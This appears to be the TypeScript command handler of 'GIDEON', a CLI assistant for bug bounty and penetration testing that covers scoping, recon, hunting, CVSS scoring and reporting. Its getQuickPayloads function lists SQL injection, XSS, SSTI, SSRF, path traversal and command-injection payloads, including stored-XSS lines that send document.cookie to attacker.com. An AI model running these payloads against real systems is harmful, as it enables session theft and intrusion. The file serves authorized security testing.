import { CommandContext, CommandResult } from './types';
import {
  createSession,
  setScope,
  updateSessionStatus,
  addFinding,
  getSessionStats,
  isInScope,
  buildGideonSystemPrompt,
  buildHuntPrompt,
  buildReconPrompt,
  buildChainPrompt,
  buildReportPrompt,
  getToolsForCategory,
  getAllTools,
  generatePassiveReconCommands,
  generateActiveReconCommands,
  generateSubdomainEnumCommands,
  calculateCVSS,
  generateFindingTemplate,
  generateEngagementReport,
  formatHackerOneReport,
  formatBugcrowdReport,
  GIDEON_IDENTITY,
  GideonSession,
  GideonMode,
  ScopeDefinition,
  SeverityLevel,
  VulnerabilityClass,
  ToolCategory,
  TOOL_CATEGORIES,
} from '../gideon';

// Global session state (in production, this would be persisted)
let currentSession: GideonSession | null = null;

/**
 * GIDEON Security Research Assistant Command Handler
 *
 * An autonomous assistant for bug bounty hunting, penetration testing,
 * and security research.
 *
 * Commands:
 *   /scope <program> [file]   - Define engagement scope
 *   /recon <target>           - Run reconnaissance
 *   /hunt <vuln-class>        - Hunt for specific vulnerability
 *   /chain                    - Analyze attack chains
 *   /report <severity>        - Generate finding report
 *   /tools <category>         - Get tool recommendations
 *   /check <target>           - Check if target is in scope
 *   /severity [finding]       - Calculate CVSS severity
 *   /status                   - Show engagement status
 *   /help                     - Show help
 */
export async function handleGideonCommand(
  args: string[],
  context: CommandContext
): Promise<CommandResult> {
  const subcommand = args[0]?.toLowerCase();

  if (!subcommand || subcommand === 'help') {
    return showHelp();
  }

  switch (subcommand) {
    case 'scope':
      return handleScope(args.slice(1));

    case 'recon':
      return handleRecon(args.slice(1));

    case 'hunt':
      return handleHunt(args.slice(1));

    case 'chain':
      return handleChain();

    case 'report':
      return handleReport(args.slice(1));

    case 'tools':
      return handleTools(args.slice(1));

    case 'check':
      return handleCheck(args.slice(1));

    case 'severity':
      return handleSeverity(args.slice(1));

    case 'status':
      return handleStatus();

    case 'start':
      return handleStart(args.slice(1));

    case 'prompt':
      return handlePrompt(args.slice(1));

    default:
      return {
        success: false,
        output: `Unknown GIDEON command: ${subcommand}\nRun 'gideon help' for available commands.`,
        error: 'Unknown command',
      };
  }
}

/**
 * Start a new GIDEON session
 */
function handleStart(args: string[]): CommandResult {
  const modeArg = args[0]?.toLowerCase();
  const validModes: GideonMode[] = ['bounty', 'pentest', 'research', 'ctf'];

  if (!modeArg || !validModes.includes(modeArg as GideonMode)) {
    return {
      success: false,
      output: `Invalid mode. Use one of: ${validModes.join(', ')}`,
      error: 'Invalid mode',
    };
  }

  currentSession = createSession(modeArg as GideonMode);

  const modeDescriptions: Record<GideonMode, string> = {
    bounty: 'Bug Bounty Hunting - Focus on finding reportable vulnerabilities for bounty programs',
    pentest: 'Penetration Testing - Authorized comprehensive security assessment',
    research: 'Security Research - Read-only analysis and vulnerability research',
    ctf: 'Capture The Flag - Competition-focused security challenges',
  };

  let output = `
# GIDEON Session Started

**Mode**: ${modeArg.toUpperCase()}
**Session ID**: ${currentSession.id}
**Started At**: ${currentSession.startedAt}

## ${modeDescriptions[modeArg as GideonMode]}

### Next Steps

1. Define your scope with \`gideon scope <program-name>\`
2. Run reconnaissance with \`gideon recon <target>\`
3. Hunt for vulnerabilities with \`gideon hunt <vuln-class>\`

### Quick Commands

| Command | Description |
|---------|-------------|
| \`gideon scope\` | Define engagement scope |
| \`gideon recon\` | Run reconnaissance |
| \`gideon hunt\` | Hunt vulnerabilities |
| \`gideon status\` | Check session status |

---
*GIDEON is ready to assist with your security assessment.*
`;

  return {
    success: true,
    output,
    artifacts: {
      json: currentSession,
    },
  };
}

/**
 * Define engagement scope
 */
function handleScope(args: string[]): CommandResult {
  const programName = args[0];

  if (!programName) {
    return {
      success: false,
      output: `
# Define Engagement Scope

Usage: \`gideon scope <program-name> [options]\`

## Options

| Option | Description |
|--------|-------------|
| \`--platform <name>\` | Platform (hackerone, bugcrowd, intigriti, yeswehack, private) |
| \`--domain <domain>\` | Add in-scope domain (can be repeated) |
| \`--wildcard <pattern>\` | Add wildcard domain (e.g., *.example.com) |
| \`--exclude <domain>\` | Add out-of-scope domain |
| \`--no-dos\` | Mark DoS as out of scope |

## Example

\`\`\`
gideon scope "Example Corp" --platform hackerone --domain example.com --wildcard "*.example.com"
\`\`\`

## Interactive Scope Definition

Provide scope details in the following format:

\`\`\`yaml
program: Example Corp
platform: hackerone
in_scope:
  domains:
    - example.com
    - api.example.com
  wildcards:
    - "*.staging.example.com"
out_of_scope:
  domains:
    - blog.example.com
  paths:
    - /admin
  vuln_types:
    - DoS
    - Social Engineering
rules:
  rate_limit: "10 req/sec"
  testing_windows: "24/7"
rewards:
  critical: "$5,000 - $10,000"
  high: "$2,000 - $5,000"
  medium: "$500 - $2,000"
  low: "$100 - $500"
\`\`\`
`,
      error: 'Missing program name',
    };
  }

  // Parse options
  const scope: ScopeDefinition = {
    programName,
    platform: 'private',
    inScope: {
      domains: [],
      wildcards: [],
      ipRanges: [],
      applications: [],
      apis: [],
    },
    outOfScope: {
      domains: [],
      ipRanges: [],
      paths: [],
      vulnerabilityTypes: [],
    },
    rules: {
      prohibitedActions: ['DoS attacks', 'Social engineering', 'Physical attacks'],
    },
    safeHarbor: false,
  };

  // Parse remaining args
  for (let i = 1; i < args.length; i++) {
    const arg = args[i];
    const nextArg = args[i + 1];

    switch (arg) {
      case '--platform':
        scope.platform = nextArg as ScopeDefinition['platform'];
        i++;
        break;
      case '--domain':
        scope.inScope.domains.push(nextArg);
        i++;
        break;
      case '--wildcard':
        scope.inScope.wildcards.push(nextArg);
        i++;
        break;
      case '--api':
        scope.inScope.apis.push(nextArg);
        i++;
        break;
      case '--exclude':
        scope.outOfScope.domains.push(nextArg);
        i++;
        break;
      case '--no-dos':
        scope.outOfScope.vulnerabilityTypes.push('DoS');
        break;
      case '--safe-harbor':
        scope.safeHarbor = true;
        break;
    }
  }

  // Create session if not exists
  if (!currentSession) {
    currentSession = createSession('bounty');
  }

  setScope(currentSession, scope);
  updateSessionStatus(currentSession, 'scoping');

  let output = `
# Scope Defined

**Program**: ${programName}
**Platform**: ${scope.platform}
**Session**: ${currentSession.id}

## In-Scope Assets

`;

  if (scope.inScope.domains.length > 0) {
    output += `### Domains\n`;
    for (const d of scope.inScope.domains) {
      output += `- ${d}\n`;
    }
  }

  if (scope.inScope.wildcards.length > 0) {
    output += `\n### Wildcards\n`;
    for (const w of scope.inScope.wildcards) {
      output += `- ${w}\n`;
    }
  }

  if (scope.outOfScope.domains.length > 0 || scope.outOfScope.vulnerabilityTypes.length > 0) {
    output += `\n## Out-of-Scope\n`;
    for (const d of scope.outOfScope.domains) {
      output += `- ${d}\n`;
    }
    for (const v of scope.outOfScope.vulnerabilityTypes) {
      output += `- ${v}\n`;
    }
  }

  output += `
## Next Steps

1. Run reconnaissance: \`gideon recon ${scope.inScope.domains[0] || 'target.com'}\`
2. Enumerate subdomains: \`gideon recon ${scope.inScope.wildcards[0] || '*.target.com'} --mode active\`
3. Start hunting: \`gideon hunt sqli\` or \`gideon hunt xss_stored\`

---
*Remember: Stay within scope and follow the program's rules of engagement.*
`;

  return {
    success: true,
    output,
    artifacts: {
      json: scope,
    },
  };
}

/**
 * Run reconnaissance
 */
function handleRecon(args: string[]): CommandResult {
  const target = args[0];

  if (!target) {
    return {
      success: false,
      output: `
# Reconnaissance

Usage: \`gideon recon <target> [options]\`

## Options

| Option | Description |
|--------|-------------|
| \`--mode <type>\` | Recon mode: passive, active, osint |
| \`--subdomain\` | Focus on subdomain enumeration |
| \`--tech\` | Technology fingerprinting |
| \`--ports\` | Port scanning |

## Examples

\`\`\`bash
gideon recon example.com                    # Passive recon
gideon recon example.com --mode active      # Active probing
gideon recon example.com --subdomain        # Subdomain focus
\`\`\`
`,
      error: 'Missing target',
    };
  }

  // Check scope if session exists
  if (currentSession?.scope) {
    const scopeCheck = isInScope(target, currentSession.scope);
    if (!scopeCheck.inScope) {
      return {
        success: false,
        output: `**WARNING**: Target may be out of scope.\n\nReason: ${scopeCheck.reason}\n\nVerify scope before proceeding.`,
        error: 'Target may be out of scope',
      };
    }
  }

  // Determine recon mode
  const modeArg = args.includes('--mode') ? args[args.indexOf('--mode') + 1] : 'passive';
  const isActive = modeArg === 'active';
  const isSubdomain = args.includes('--subdomain');

  let output = `
# Reconnaissance: ${target}

**Mode**: ${modeArg.toUpperCase()}
**Target**: ${target}
`;

  if (isSubdomain) {
    output += `\n## Subdomain Enumeration Commands\n\n\`\`\`bash\n`;
    const commands = generateSubdomainEnumCommands(target);
    for (const cmd of commands) {
      output += `${cmd}\n`;
    }
    output += `\`\`\`\n`;
  } else if (isActive) {
    output += `\n## Active Reconnaissance Commands\n\n\`\`\`bash\n`;
    const commands = generateActiveReconCommands(target);
    for (const cmd of commands) {
      output += `${cmd}\n`;
    }
    output += `\`\`\`\n`;
  } else {
    output += `\n## Passive Reconnaissance Commands\n\n\`\`\`bash\n`;
    const commands = generatePassiveReconCommands(target);
    for (const cmd of commands) {
      output += `${cmd}\n`;
    }
    output += `\`\`\`\n`;
  }

  output += `
## Recon Checklist

- [ ] Subdomain enumeration
- [ ] Technology fingerprinting
- [ ] Port scanning (if authorized)
- [ ] Directory/file discovery
- [ ] JavaScript analysis
- [ ] API endpoint discovery
- [ ] Historical data (Wayback, etc.)
- [ ] GitHub/GitLab reconnaissance
- [ ] Cloud asset discovery

## Suggested Tools

`;

  const reconTools = getToolsForCategory('recon');
  for (const tool of reconTools.slice(0, 5)) {
    output += `- **${tool.name}**: ${tool.description}\n`;
  }

  output += `
## AI-Assisted Analysis

Use the GIDEON prompt for deeper analysis:
\`gideon prompt recon ${target}\`
`;

  // Update session if exists
  if (currentSession) {
    updateSessionStatus(currentSession, 'recon');
    currentSession.activityLog.push({
      timestamp: new Date().toISOString(),
      action: 'recon_started',
      details: `Started ${modeArg} recon on ${target}`,
      phase: 'recon',
    });
  }

  return {
    success: true,
    output,
    artifacts: {
      markdown: buildReconPrompt(target, isActive ? 'active' : 'passive'),
    },
  };
}

/**
 * Hunt for specific vulnerability class
 */
function handleHunt(args: string[]): CommandResult {
  const vulnClass = args[0]?.toLowerCase();

  if (!vulnClass) {
    return {
      success: false,
      output: `
# Vulnerability Hunting

Usage: \`gideon hunt <vulnerability-class>\`

## Vulnerability Classes

### Injection
| Class | Description |
|-------|-------------|
| \`sqli\` | SQL Injection |
| \`nosqli\` | NoSQL Injection |
| \`cmdi\` | Command Injection |
| \`ssti\` | Server-Side Template Injection |
| \`graphql_injection\` | GraphQL Injection |

### Authentication & Session
| Class | Description |
|-------|-------------|
| \`auth_bypass\` | Authentication Bypass |
| \`jwt_vuln\` | JWT Vulnerabilities |
| \`oauth_misconfig\` | OAuth Misconfigurations |
| \`mfa_bypass\` | MFA Bypass |

### Access Control
| Class | Description |
|-------|-------------|
| \`idor\` | Insecure Direct Object Reference |
| \`privilege_escalation\` | Privilege Escalation |
| \`path_traversal\` | Path Traversal |

### Client-Side
| Class | Description |
|-------|-------------|
| \`xss_reflected\` | Reflected XSS |
| \`xss_stored\` | Stored XSS |
| \`xss_dom\` | DOM-based XSS |
| \`csrf\` | Cross-Site Request Forgery |
| \`cors\` | CORS Misconfiguration |

### Business Logic
| Class | Description |
|-------|-------------|
| \`race_condition\` | Race Conditions |
| \`price_manipulation\` | Price Manipulation |
| \`rate_limit_bypass\` | Rate Limit Bypass |

### Modern/Advanced
| Class | Description |
|-------|-------------|
| \`ssrf\` | Server-Side Request Forgery |
| \`prototype_pollution\` | Prototype Pollution |
| \`request_smuggling\` | HTTP Request Smuggling |
| \`subdomain_takeover\` | Subdomain Takeover |

## Example

\`\`\`bash
gideon hunt sqli
gideon hunt xss_stored
gideon hunt idor
\`\`\`
`,
      error: 'Missing vulnerability class',
    };
  }

  // Generate hunt prompt
  const target = currentSession?.scope?.inScope.domains[0] || 'target';
  const huntPrompt = buildHuntPrompt(vulnClass as VulnerabilityClass, target);

  let output = `
# Hunting: ${vulnClass.toUpperCase()}

## Methodology

${huntPrompt}

## Quick Test Payloads

`;

  // Add quick payloads based on vuln class
  const payloads = getQuickPayloads(vulnClass);
  if (payloads.length > 0) {
    output += `\`\`\`\n`;
    for (const payload of payloads) {
      output += `${payload}\n`;
    }
    output += `\`\`\`\n`;
  }

  // Add relevant tools
  const toolCategory = getToolCategoryForVuln(vulnClass);
  if (toolCategory) {
    output += `\n## Recommended Tools\n\n`;
    const tools = getToolsForCategory(toolCategory);
    for (const tool of tools.slice(0, 3)) {
      output += `- **${tool.name}**: ${tool.description}\n`;
      if (tool.command) {
        output += `  \`${tool.command}\`\n`;
      }
    }
  }

  // Update session
  if (currentSession) {
    updateSessionStatus(currentSession, 'active');
    currentSession.activityLog.push({
      timestamp: new Date().toISOString(),
      action: 'hunt_started',
      details: `Started hunting for ${vulnClass}`,
      phase: 'active',
    });
  }

  return {
    success: true,
    output,
    artifacts: {
      markdown: huntPrompt,
    },
  };
}

/**
 * Analyze attack chains
 */
function handleChain(): CommandResult {
  if (!currentSession || currentSession.findings.length < 2) {
    return {
      success: false,
      output: `
# Attack Chain Analysis

Requires at least 2 findings to analyze potential attack chains.

Current findings: ${currentSession?.findings.length || 0}

## What is an Attack Chain?

Attack chains combine multiple lower-severity vulnerabilities into a higher-impact attack.

### Examples

1. **Information Disclosure → Account Takeover**
   - Exposed user IDs (low) + IDOR (medium) = Account compromise (high)

2. **CORS + XSS → Session Hijacking**
   - Misconfigured CORS (medium) + Stored XSS (medium) = Full session theft (critical)

3. **SSRF → Cloud Metadata → RCE**
   - SSRF (medium) → Cloud credentials (high) → Command execution (critical)

## Recording Findings

Use \`gideon report <severity>\` to record findings, then run \`gideon chain\` to analyze.
`,
      error: 'Insufficient findings',
    };
  }

  const chainPrompt = buildChainPrompt(currentSession.findings);

  let output = `
# Attack Chain Analysis

Analyzing ${currentSession.findings.length} findings for potential chains...

## Current Findings

`;

  for (const finding of currentSession.findings) {
    output += `- [${finding.severity.toUpperCase()}] ${finding.title} (${finding.vulnerabilityClass})\n`;
  }

  output += `
## Potential Chains

${chainPrompt}

## Next Steps

1. Document any identified chains
2. Test chain viability
3. Calculate combined severity
4. Prepare comprehensive report
`;

  return {
    success: true,
    output,
    artifacts: {
      markdown: chainPrompt,
    },
  };
}

/**
 * Generate finding report
 */
function handleReport(args: string[]): CommandResult {
  const severityArg = args[0]?.toLowerCase() as SeverityLevel;
  const validSeverities: SeverityLevel[] = ['critical', 'high', 'medium', 'low', 'informational'];

  if (!severityArg) {
    // Check if we should generate full engagement report
    if (args.includes('--full') && currentSession) {
      const report = generateEngagementReport(currentSession);
      return {
        success: true,
        output: `# Full Engagement Report Generated\n\n${report}`,
        artifacts: {
          markdown: report,
          json: currentSession,
        },
      };
    }

    // Check platform-specific format
    if (args.includes('--hackerone') && currentSession?.findings.length) {
      const report = formatHackerOneReport(currentSession.findings[0]);
      return {
        success: true,
        output: `# HackerOne Report Format\n\n${report}`,
        artifacts: { markdown: report },
      };
    }

    if (args.includes('--bugcrowd') && currentSession?.findings.length) {
      const report = formatBugcrowdReport(currentSession.findings[0]);
      return {
        success: true,
        output: `# Bugcrowd Report Format\n\n${report}`,
        artifacts: { markdown: report },
      };
    }

    return {
      success: false,
      output: `
# Generate Finding Report

Usage: \`gideon report <severity> [options]\`

## Severity Levels

| Level | Description |
|-------|-------------|
| \`critical\` | Remote code execution, full system compromise |
| \`high\` | Data breach, authentication bypass |
| \`medium\` | XSS, CSRF, limited data access |
| \`low\` | Information disclosure, minor issues |
| \`informational\` | Best practice recommendations |

## Options

| Option | Description |
|--------|-------------|
| \`--full\` | Generate full engagement report |
| \`--hackerone\` | Format for HackerOne submission |
| \`--bugcrowd\` | Format for Bugcrowd submission |

## Examples

\`\`\`bash
gideon report critical
gideon report high --hackerone
gideon report --full
\`\`\`
`,
      error: 'Missing severity',
    };
  }

  if (!validSeverities.includes(severityArg)) {
    return {
      success: false,
      output: `Invalid severity. Use: ${validSeverities.join(', ')}`,
      error: 'Invalid severity',
    };
  }

  const template = generateFindingTemplate(severityArg);
  const reportPrompt = buildReportPrompt(severityArg);

  let output = `
# Finding Report Template: ${severityArg.toUpperCase()}

${template}

---

## Writing Guidelines

${reportPrompt}

---

## Report Checklist

- [ ] Clear, descriptive title
- [ ] Accurate severity assessment
- [ ] Complete reproduction steps
- [ ] Working proof of concept
- [ ] Impact clearly explained
- [ ] Remediation suggestions
- [ ] Supporting evidence attached
`;

  // Update session
  if (currentSession) {
    updateSessionStatus(currentSession, 'reporting');
  }

  return {
    success: true,
    output,
    artifacts: {
      markdown: template,
    },
  };
}

/**
 * Get tool recommendations
 */
function handleTools(args: string[]): CommandResult {
  const categoryArg = args[0]?.toLowerCase() as ToolCategory;

  if (!categoryArg) {
    let output = `
# Security Tool Recommendations

## Categories

`;

    for (const category of TOOL_CATEGORIES) {
      const tools = getToolsForCategory(category as ToolCategory);
      output += `### ${category.charAt(0).toUpperCase() + category.slice(1)}\n\n`;
      for (const tool of tools.slice(0, 3)) {
        output += `- **${tool.name}**: ${tool.description}\n`;
      }
      output += '\n';
    }

    output += `
## Usage

\`gideon tools <category>\`

Categories: ${TOOL_CATEGORIES.join(', ')}
`;

    return {
      success: true,
      output,
    };
  }

  if (!TOOL_CATEGORIES.includes(categoryArg)) {
    return {
      success: false,
      output: `Invalid category. Use: ${TOOL_CATEGORIES.join(', ')}`,
      error: 'Invalid category',
    };
  }

  const tools = getToolsForCategory(categoryArg);

  let output = `
# ${categoryArg.charAt(0).toUpperCase() + categoryArg.slice(1)} Tools

`;

  for (const tool of tools) {
    output += `## ${tool.name}\n\n`;
    output += `${tool.description}\n\n`;

    if (tool.installCommand) {
      output += `**Install**: \`${tool.installCommand}\`\n\n`;
    }

    if (tool.command) {
      output += `**Usage**: \`${tool.command}\`\n\n`;
    }

    if (tool.url) {
      output += `**URL**: ${tool.url}\n\n`;
    }

    output += `**Use Case**: ${tool.useCase}\n\n---\n\n`;
  }

  return {
    success: true,
    output,
  };
}

/**
 * Check if target is in scope
 */
function handleCheck(args: string[]): CommandResult {
  const target = args[0];

  if (!target) {
    return {
      success: false,
      output: 'Usage: `gideon check <target>`\n\nCheck if a target (domain, URL, IP) is within engagement scope.',
      error: 'Missing target',
    };
  }

  if (!currentSession?.scope) {
    return {
      success: false,
      output: 'No scope defined. Use `gideon scope <program>` first.',
      error: 'No scope defined',
    };
  }

  const result = isInScope(target, currentSession.scope);

  let output = `
# Scope Check: ${target}

**Result**: ${result.inScope ? 'IN SCOPE' : 'OUT OF SCOPE'}
**Reason**: ${result.reason}

`;

  if (!result.inScope) {
    output += `**WARNING**: Do not test this target without proper authorization.\n`;
  }

  return {
    success: true,
    output,
  };
}

/**
 * Calculate CVSS severity
 */
function handleSeverity(args: string[]): CommandResult {
  // Interactive CVSS calculator
  const output = `
# CVSS 3.1 Severity Calculator

## Quick Calculator

Provide CVSS metrics to calculate severity:

\`\`\`
gideon severity --av N --ac L --pr N --ui N --s U --c H --i H --a H
\`\`\`

## Metrics

### Attack Vector (AV)
- **N** - Network (remotely exploitable)
- **A** - Adjacent (local network)
- **L** - Local (requires local access)
- **P** - Physical (requires physical access)

### Attack Complexity (AC)
- **L** - Low (easy to exploit)
- **H** - High (requires specific conditions)

### Privileges Required (PR)
- **N** - None (no authentication needed)
- **L** - Low (basic user privileges)
- **H** - High (admin privileges)

### User Interaction (UI)
- **N** - None (no user action required)
- **R** - Required (victim must take action)

### Scope (S)
- **U** - Unchanged (affects only vulnerable component)
- **C** - Changed (affects other components)

### Impact: Confidentiality (C), Integrity (I), Availability (A)
- **N** - None
- **L** - Low
- **H** - High

## Common Scores

| Vulnerability Type | Typical CVSS | Rating |
|-------------------|--------------|--------|
| RCE (Unauthenticated) | 9.8 | Critical |
| SQL Injection | 8.6 | High |
| Stored XSS | 6.1 | Medium |
| Reflected XSS | 6.1 | Medium |
| CSRF | 4.3 | Medium |
| Information Disclosure | 4.3 | Medium |
| Open Redirect | 3.4 | Low |

## Example Calculation

`;

  // Parse args and calculate if provided
  const avIndex = args.indexOf('--av');
  const acIndex = args.indexOf('--ac');
  const prIndex = args.indexOf('--pr');
  const uiIndex = args.indexOf('--ui');
  const sIndex = args.indexOf('--s');
  const cIndex = args.indexOf('--c');
  const iIndex = args.indexOf('--i');
  const aIndex = args.indexOf('--a');

  if (avIndex >= 0 && acIndex >= 0 && prIndex >= 0 && uiIndex >= 0 &&
      sIndex >= 0 && cIndex >= 0 && iIndex >= 0 && aIndex >= 0) {
    const cvssInput = {
      attackVector: args[avIndex + 1] as 'N' | 'A' | 'L' | 'P',
      attackComplexity: args[acIndex + 1] as 'L' | 'H',
      privilegesRequired: args[prIndex + 1] as 'N' | 'L' | 'H',
      userInteraction: args[uiIndex + 1] as 'N' | 'R',
      scope: args[sIndex + 1] as 'U' | 'C',
      confidentiality: args[cIndex + 1] as 'N' | 'L' | 'H',
      integrity: args[iIndex + 1] as 'N' | 'L' | 'H',
      availability: args[aIndex + 1] as 'N' | 'L' | 'H',
    };

    const result = calculateCVSS(cvssInput);

    return {
      success: true,
      output: `
# CVSS Calculation Result

**Score**: ${result.score}
**Severity**: ${result.severity.toUpperCase()}
**Vector String**: ${result.vector}

## Breakdown

- Attack Vector: ${cvssInput.attackVector}
- Attack Complexity: ${cvssInput.attackComplexity}
- Privileges Required: ${cvssInput.privilegesRequired}
- User Interaction: ${cvssInput.userInteraction}
- Scope: ${cvssInput.scope}
- Confidentiality Impact: ${cvssInput.confidentiality}
- Integrity Impact: ${cvssInput.integrity}
- Availability Impact: ${cvssInput.availability}
`,
      artifacts: {
        json: result,
      },
    };
  }

  return {
    success: true,
    output,
  };
}

/**
 * Show engagement status
 */
function handleStatus(): CommandResult {
  if (!currentSession) {
    return {
      success: true,
      output: `
# No Active Session

Start a new session with: \`gideon start <mode>\`

Available modes:
- **bounty** - Bug bounty hunting
- **pentest** - Penetration testing
- **research** - Security research
- **ctf** - Capture the flag
`,
    };
  }

  const stats = getSessionStats(currentSession);

  let output = `
# GIDEON Session Status

**Session ID**: ${currentSession.id}
**Mode**: ${currentSession.mode.toUpperCase()}
**Status**: ${currentSession.status.toUpperCase()}
**Duration**: ${stats.duration}

## Scope

**Program**: ${currentSession.scope?.programName || 'Not defined'}
**Platform**: ${currentSession.scope?.platform || 'N/A'}

## Findings

**Total**: ${stats.totalFindings}

| Severity | Count |
|----------|-------|
| Critical | ${stats.bySeverity.critical} |
| High | ${stats.bySeverity.high} |
| Medium | ${stats.bySeverity.medium} |
| Low | ${stats.bySeverity.low} |
| Info | ${stats.bySeverity.informational} |

## Vulnerability Classes

`;

  for (const [cls, count] of Object.entries(stats.byClass)) {
    output += `- ${cls}: ${count}\n`;
  }

  output += `
## Recent Activity

`;

  const recentLogs = currentSession.activityLog.slice(-5).reverse();
  for (const log of recentLogs) {
    output += `- [${log.phase}] ${log.action}: ${log.details}\n`;
  }

  return {
    success: true,
    output,
    artifacts: {
      json: currentSession,
    },
  };
}

/**
 * Generate AI prompts for various tasks
 */
function handlePrompt(args: string[]): CommandResult {
  const promptType = args[0]?.toLowerCase();
  const target = args[1] || 'target';

  if (!promptType) {
    return {
      success: true,
      output: `
# GIDEON AI Prompts

Generate specialized prompts for AI-assisted security testing.

## Usage

\`gideon prompt <type> [target]\`

## Prompt Types

| Type | Description |
|------|-------------|
| \`system\` | Full GIDEON system prompt |
| \`recon\` | Reconnaissance prompt |
| \`hunt\` | Vulnerability hunting prompt |
| \`chain\` | Attack chain analysis prompt |
| \`report\` | Report writing prompt |

## Examples

\`\`\`bash
gideon prompt system
gideon prompt recon example.com
gideon prompt hunt sqli
\`\`\`
`,
    };
  }

  let prompt = '';

  switch (promptType) {
    case 'system':
      prompt = buildGideonSystemPrompt(
        currentSession?.mode || 'bounty',
        currentSession?.scope
      );
      break;

    case 'recon':
      prompt = buildReconPrompt(target, 'passive');
      break;

    case 'hunt':
      const vulnClass = args[1] as VulnerabilityClass || 'sqli';
      prompt = buildHuntPrompt(vulnClass, args[2]);
      break;

    case 'chain':
      if (currentSession?.findings.length) {
        prompt = buildChainPrompt(currentSession.findings);
      } else {
        prompt = 'No findings available for chain analysis.';
      }
      break;

    case 'report':
      const severity = (args[1] as SeverityLevel) || 'high';
      prompt = buildReportPrompt(severity);
      break;

    default:
      return {
        success: false,
        output: `Unknown prompt type: ${promptType}`,
        error: 'Unknown prompt type',
      };
  }

  return {
    success: true,
    output: `# ${promptType.toUpperCase()} Prompt\n\n\`\`\`\n${prompt}\n\`\`\``,
    artifacts: {
      markdown: prompt,
    },
  };
}

/**
 * Show help message
 */
function showHelp(): CommandResult {
  return {
    success: true,
    output: `
# GIDEON - Security Research Assistant

**G**uided **I**ntelligence for **D**efense, **E**xploitation, and **O**ffensive **N**avigation

## Quick Start

\`\`\`bash
gideon start bounty                         # Start bug bounty session
gideon scope "Example Corp" --domain example.com
gideon recon example.com
gideon hunt sqli
\`\`\`

## Commands

| Command | Description |
|---------|-------------|
| \`gideon start <mode>\` | Start new session (bounty, pentest, research, ctf) |
| \`gideon scope <program>\` | Define engagement scope |
| \`gideon recon <target>\` | Run reconnaissance |
| \`gideon hunt <vuln-class>\` | Hunt for specific vulnerability type |
| \`gideon chain\` | Analyze attack chains from findings |
| \`gideon report <severity>\` | Generate finding report template |
| \`gideon tools [category]\` | Get tool recommendations |
| \`gideon check <target>\` | Verify target is in scope |
| \`gideon severity\` | Calculate CVSS score |
| \`gideon status\` | Show session status |
| \`gideon prompt <type>\` | Generate AI prompts |
| \`gideon help\` | Show this help |

## Session Modes

| Mode | Description |
|------|-------------|
| \`bounty\` | Bug bounty hunting - focus on reportable vulnerabilities |
| \`pentest\` | Penetration testing - comprehensive authorized assessment |
| \`research\` | Security research - read-only analysis |
| \`ctf\` | Capture the flag - competition challenges |

## Vulnerability Classes

\`\`\`
sqli, nosqli, cmdi, ssti, xss_stored, xss_reflected, xss_dom,
csrf, idor, auth_bypass, jwt_vuln, ssrf, race_condition, cors,
path_traversal, subdomain_takeover, prototype_pollution, and more
\`\`\`

## Tool Categories

\`\`\`
recon, subdomain, portscan, fuzzing, injection, xss, auth, api, cloud
\`\`\`

## Examples

\`\`\`bash
# Full workflow
gideon start bounty
gideon scope "ACME Corp" --platform hackerone --domain acme.com --wildcard "*.acme.com"
gideon recon acme.com --mode passive
gideon recon acme.com --subdomain
gideon hunt idor
gideon report high --hackerone

# Quick checks
gideon check api.staging.acme.com
gideon tools fuzzing
gideon severity --av N --ac L --pr N --ui N --s U --c H --i H --a N
\`\`\`

---
${GIDEON_IDENTITY.slice(0, 200)}...
`,
  };
}

/**
 * Get quick payloads for a vulnerability class
 */
function getQuickPayloads(vulnClass: string): string[] {
  const payloads: Record<string, string[]> = {
    sqli: [
      "' OR '1'='1",
      "' OR '1'='1' --",
      "1; SELECT * FROM users--",
      "1' UNION SELECT null,null,null--",
      "admin'--",
    ],
    xss_reflected: [
      '<script>alert(1)</script>',
      '"><script>alert(1)</script>',
      "javascript:alert(1)",
      '<img src=x onerror=alert(1)>',
      '<svg onload=alert(1)>',
    ],
    xss_stored: [
      '<script>alert(document.cookie)</script>',
      '<img src=x onerror="fetch(\'https://attacker.com/?\'+document.cookie)">',
      '<svg/onload=fetch(`//attacker.com/${document.cookie}`)>',
    ],
    xss_dom: [
      '#<img src=x onerror=alert(1)>',
      'javascript:alert(1)',
      '"><img src=x onerror=alert(1)>',
    ],
    ssti: [
      '{{7*7}}',
      '${7*7}',
      '<%= 7*7 %>',
      '{{config}}',
      '{{self.__class__.__mro__[2].__subclasses__()}}',
    ],
    ssrf: [
      'http://localhost/',
      'http://127.0.0.1/',
      'http://169.254.169.254/latest/meta-data/',
      'http://[::1]/',
      'file:///etc/passwd',
    ],
    path_traversal: [
      '../../../etc/passwd',
      '..\\..\\..\\windows\\system32\\config\\sam',
      '....//....//....//etc/passwd',
      '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
    ],
    cmdi: [
      '; ls -la',
      '| cat /etc/passwd',
      '`id`',
      '$(whoami)',
      '|| ping -c 1 attacker.com',
    ],
  };

  return payloads[vulnClass] || [];
}

/**
 * Map vulnerability class to tool category
 */
function getToolCategoryForVuln(vulnClass: string): ToolCategory | null {
  const mapping: Record<string, ToolCategory> = {
    sqli: 'injection',
    nosqli: 'injection',
    cmdi: 'injection',
    ssti: 'injection',
    xss_reflected: 'xss',
    xss_stored: 'xss',
    xss_dom: 'xss',
    auth_bypass: 'auth',
    jwt_vuln: 'auth',
    oauth_misconfig: 'auth',
    idor: 'fuzzing',
    path_traversal: 'fuzzing',
    ssrf: 'fuzzing',
    api_auth: 'api',
    graphql_injection: 'api',
    cloud_misconfig: 'cloud',
  };

  return mapping[vulnClass] || null;
}

export { currentSession };
